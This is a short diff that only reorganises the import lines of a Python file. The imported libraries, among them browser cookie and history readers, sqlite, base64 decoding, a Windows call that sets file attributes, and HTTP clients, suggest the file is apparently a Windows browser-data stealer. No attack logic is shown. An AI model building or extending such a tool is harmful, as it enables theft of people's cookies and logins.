@@ -1,5 +1,4 @@
-import os
-import sys
+import os, sys, win32con, browser_cookie3
 from json import loads
 from base64 import b64decode
 from sqlite3 import connect
@@ -12,9 +11,7 @@ from subprocess import Popen, PIPE
 from urllib.request import urlopen, Request
 from requests import get
 from re import findall, search
-import win32con
 from win32api import SetFileAttributes, GetSystemMetrics
-import browser_cookie3
 from browser_history import get_history
 from prettytable import PrettyTable
 from platform import platform
